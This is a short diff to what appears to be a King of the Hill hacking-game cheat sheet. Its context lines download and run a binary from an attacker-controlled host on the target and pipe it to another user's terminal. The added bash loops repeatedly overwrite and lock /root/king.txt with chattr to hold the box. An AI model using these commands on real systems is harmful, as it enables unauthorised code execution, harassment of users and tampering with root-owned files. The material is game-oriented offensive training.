@@ -76,3 +76,11 @@ wget http://yourip:port/nyancat   //on the KOTH_machine
 chmod +x nyancat
 ./nyancat > /dev/pts/#
 ```
+-----------------------------------------------------------------------------
+-----------------------------------------------------------------------------
+## while loop Tricks
+```
+while [[ $(cat /root/king.txt) != "USERNAME" ]]; do echo "USERNAME" > /root/king.txt; done
+while true do; chattr -ia /root/king.txt 2>/dev/null; echo "USERNAME" >/root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done
+```
+
